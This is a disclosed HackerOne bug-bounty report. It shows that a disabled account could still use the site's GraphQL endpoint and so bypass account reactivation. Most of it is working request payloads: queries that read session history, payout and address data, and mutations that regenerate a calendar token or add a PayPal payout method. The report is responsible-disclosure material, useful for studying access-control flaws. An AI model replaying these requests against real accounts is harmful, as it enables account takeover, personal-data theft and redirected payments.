# Disabled account can still use GraphQL endpoint

## Report Details
- **Report ID**: 608656
- **URL**: https://hackerone.com/reports/608656
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-06-12T03:10:03.505Z
- **Disclosed**: 2020-03-12T04:05:13.941Z

## Reporter
- **Username**: tolo7010
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
## Summary

Hi team & @jobert,

I am not sure if it is by design. After disabling the account, the user will be forced to `Enable` his account after logging in. However, many of actions are implemented using GraphQL endpoint which bypasses account reactivation process before use. 

Since re-enabling the account will notify the original user via an email message, the attacker gaining access to the disabled victim account can retrieve and modify account data by using GraphQL endpoint queries.

## Steps to reproduce
- Configure the attacker browser to work with Burp.
- Log into the (disabled) victim account.
- The following message will be shown: 

`You are unable to log in and others are unable to interact with this account. Your name remains associated with any reports that you have reported in order to preserve their history. You may enable your account again at any time.
`

- Note that clicking menu such as inbox or profile settings always redirects to https://hackerone.com/settings/disabled/edit page.
- Go to Burp HTTP History tab and look for the latest requested `/graphql` endpoint.
- Send the endpoint to the Repeater and change the POST data (body) to any endpoint. See the following section for examples:

### Getting login / session history `Sessions_page`

#### Request

```
POST /graphql? HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 394
Accept: */*
X-Auth-Token: ...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/settings/disabled/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: ...

{"query":"query Sessions_page($first_0:Int!) {me {id,...F1}} fragment F0 on UserSession {id} fragment F1 on User {_sessionssvoGn:sessions(first:$first_0) {total_count,pageInfo {hasNextPage,hasPreviousPage},edges {node {id,ip_address,user_agent,abbreviated_user_agent,country {name,flag,id},session_last_used_at,deactivated_at,device_type,current,...F0},cursor}},id}","variables":{"first_0":10}}
```

#### Response Data

```
{
  "data": {
    "me": {
      "id": "██████",
      "_sessionssvoGn": {
        "total_count": 13,
        "pageInfo": {
          "hasNextPage": true,
          "hasPreviousPage": false
        },
        "edges": [
          {
            "node": {
              "id": "██████████",
              "ip_address": "█████████",
              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
              "abbreviated_user_agent": "Chrome on Windows 10",
              "country": {
                "name": "Lao People's Democratic Republic",
                "flag": "ðŸ‡±ðŸ‡¦",
                "id": "██████████="
              },
              "session_last_used_at": "2019-06-12 02:12:12 UTC",
              "deactivated_at": null,
              "device_type": "desktop",
              "current": true
            },
            "cursor": "MQ"
          },
          {
           ...
          }
        ]
      }
    }
  }
}
```

### Getting team information `User_programs_settings_page`

#### Request

```
POST /graphql? HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 1322
Accept: */*
X-Auth-Token: ...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/settings/disabled/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: ...

{"query":"query User_programs_settings_page($first_0:Int!,$first_3:Int!,$size_1:ProfilePictureSizes!,$size_2:ProfilePictureSizes!) {me {id,...Fb}} fragment F0 on Team {_profile_picture1Fh783:profile_picture(size:$size_2),name,handle,submission_state,triage_active,state,external_program {id},id} fragment F1 on TeamMember {id} fragment F2 on TeamMember {id,auto_subscribe,...F1} fragment F3 on TeamMember {id,i_can_leave_team,...F1} fragment F4 on TeamMember {id,concealed,user {triage_user,id},...F1} fragment F5 on TeamMember {id,auto_subscribe,team {id,_id,handle,name,_profile_picturePkPpF:profile_picture(size:$size_1),...F0},...F2,...F3,...F4} fragment F6 on Team {id,handle,subscribed} fragment F7 on User {id} fragment F8 on User {id,...F7} fragment F9 on User {id,...F8} fragment Fa on User {username,_memberships33GCss:memberships(first:$first_0) {total_count,edges {node {id,...F5},cursor},pageInfo {hasNextPage,hasPreviousPage}},_team_policy_subscriptions40Jg2O:team_policy_subscriptions(first:$first_3,active:true) {edges {node {id,team {id,handle,name,_profile_picture1Fh783:profile_picture(size:$size_2),subscribed,...F6,...F0},source_type},cursor},pageInfo {hasNextPage,hasPreviousPage}},id,...F9} fragment Fb on User {id,...Fa}","variables":{"first_0":500,"first_3":25,"size_1":"small","size_2":"medium"}}
```

#### Response Data

```
{
  "data": {
    "me": {
      "id": "███",
      "username": "h1t4",
      "_memberships33GCss": {
        "total_count": 0,
        "edges": [],
        "pageInfo": {
          "hasNextPage": false,
          "hasPreviousPage": false
        }
      },
      "_team_policy_subscriptions40Jg2O": {
        "edges": [],
        "pageInfo": {
          "hasNextPage": false,
          "hasPreviousPage": false
        }
      }
    }
  }
}
```

### More example endpoints (not limited to)

#### Getting calendar token

`{"query":"query User_calendar_settings_page {query {id,...F3}} fragment F0 on User {id} fragment F1 on User {username,calendar_token,id,...F0} fragment F2 on Query {me {id,...F1},id} fragment F3 on Query {id,...F2}","variables":{}}
`

#### Regenerating calendar token

`{"query":"mutation Regenerate_calendar_token_mutation($input_0:RegenerateCalendarTokenInput!,$first_1:Int!,$throttle_time_2:Int!,$first_5:Int!,$size_3:ProfilePictureSizes!,$types_4:[ErrorTypeEnum]!) {regenerateCalendarToken(input:$input_0) {clientMutationId,...F1,...F2}} fragment F0 on User {id,username,calendar_token,name,_profile_picturePkPpF:profile_picture(size:$size_3)} fragment F1 on RegenerateCalendarTokenPayload {me {_program_health_acknowledgements2aGZgn:program_health_acknowledgements(first:$first_1,throttle_time:$throttle_time_2) {edges {node {id,reason,team_member {user {id},id,team {handle,name,sla_failed_count,id}}},cursor},pageInfo {hasNextPage,hasPreviousPage}},id,user_type,new_feature_notification {name,description,url,id},...F0}} fragment F2 on RegenerateCalendarTokenPayload {was_successful,_errors4fkckF:errors(types:$types_4,first:$first_5) {edges {node {type,field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"clientMutationId":"0"},"first_1":1,"throttle_time_2":3600,"first_5":100,"size_3":"small","types_4":"ARGUMENT"}}`

#### Getting bounty record

`{"query":"query User_bounty_settings_page($first_0:Int!,$last_2:Int!,$currency_1:CurrencyCode!,$currency_3:CurrencyCode!) {me {id,...Fg}} fragment F0 on PayoutPreferenceInterface {default,id,__typename} fragment F1 on Node {id,__typename} fragment F2 on User {tax_form {url,hello_sign_client_id,status,id},email,bounties {total_count},payout_preferences {__typename,...F0,...F1},id} fragment F3 on CoinbasePayoutPreferenceType {email,id} fragment F4 on PaypalPayoutPreferenceType {email,id} fragment F5 on HackeronePayrollPayoutPreferenceType {email,id} fragment F6 on CurrencycloudBankTransferPayoutPreferenceType {name,id} fragment F7 on User {payout_preferences {__typename,...F0,...F3,...F4,...F5,...F6,...F1},id} fragment F8 on User {_bounties2jizzK:bounties(first:$first_0) {pageInfo {hasNextPage,hasPreviousPage},edges {node {id,_id,awarded_amount,bonus_amount,awarded_currency,created_at,status,report {_id,title,team {name,handle,id},id}},cursor}},_bounties1CaoNY:bounties(currency:$currency_1) {total_amount},id} fragment F9 on User {_report_retest_usersixO8i:report_retest_users(completed:true,last:$last_2) {completed_count,total_payment_amount,edges {node {id,completed_at,report_retest {award_amount,report {_id,team {handle,name,id},id},id}},cursor},pageInfo {hasNextPage,hasPreviousPage}},id} fragment Fa on User {tax_form {url,status,signed_at,type,id},id} fragment Fb on User {id} fragment Fc on User {_bounties3jJC5o:bounties(currency:$currency_3) {total_amount},lufthansa_account {id},id,...Fb} fragment Fd on User {tax_form {id},id,...Fb} fragment Fe on User {lufthansa_account {first_name,last_name,number,id},id,...Fb} fragment Ff on User {id,...Fb} fragment Fg on User {id,tax_form {url,id},...F2,...F7,...F8,...F9,...Fa,...Fc,...Fd,...Fe,...Ff}","variables":{"first_0":25,"last_2":100,"currency_1":"USD","currency_3":"XLA"}}`

#### Payment preferences

`{"query":"query Payment_preferences {me {id,...F8}} fragment F0 on PayoutPreferenceInterface {_id,default,id,__typename} fragment F1 on CoinbasePayoutPreferenceType {email,id} fragment F2 on PaypalPayoutPreferenceType {email,id} fragment F3 on HackeronePayrollPayoutPreferenceType {email,id} fragment F4 on CurrencycloudBankTransferPayoutPreferenceType {name,id} fragment F5 on Node {id,__typename} fragment F6 on User {id} fragment F7 on User {payout_preferences {__typename,...F5},id,...F6} fragment F8 on User {username,payout_preferences {__typename,...F0,...F1,...F2,...F3,...F4,...F5},id,...F7}","variables":{}}`

#### Adding a new payment method

`{"query":"mutation Create_paypal_preference_mutation($input_0:CreatePaypalPreferenceInput!,$first_1:Int!) {createPaypalPreference(input:$input_0) {clientMutationId,...F7,...F8}} fragment F0 on PayoutPreferenceInterface {_id,default,id,__typename} fragment F1 on CoinbasePayoutPreferenceType {email,id} fragment F2 on PaypalPayoutPreferenceType {email,id} fragment F3 on HackeronePayrollPayoutPreferenceType {email,id} fragment F4 on CurrencycloudBankTransferPayoutPreferenceType {name,id} fragment F5 on Node {id,__typename} fragment F6 on User {id,payout_preferences {__typename,...F0,...F1,...F2,...F3,...F4,...F5}} fragment F7 on CreatePaypalPreferencePayload {me {id,...F6}} fragment F8 on CreatePaypalPreferencePayload {was_successful,_errors3exXYb:errors(first:$first_1) {edges {node {field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"paypal_email":"test@example.com","default_method":true,"clientMutationId":"0"},"first_1":100}}`

#### Swag settings

`{"query":"query Swag_settings($first_0:Int!) {me {id,...F3}} fragment F0 on User {id} fragment F1 on User {id,tshirt_size,...F0} fragment F2 on User {id,address {id,name,street,city,postal_code,state,country,phone_number},...F0} fragment F3 on User {id,tshirt_size,_swagnuR3p:swag(first:$first_0) {edges {node {id,created_at,report {_id,title,id},team {handle,name,id}},cursor},pageInfo {hasNextPage,hasPreviousPage}},address {name,street,city,postal_code,state,country,phone_number,id},...F1,...F2,...F0}","variables":{"first_0":500}}`

## Impact

The attacker gaining access to the disabled victim account can retrieve and modify account data by using GraphQL endpoint queries.

## Attachments
No attachments
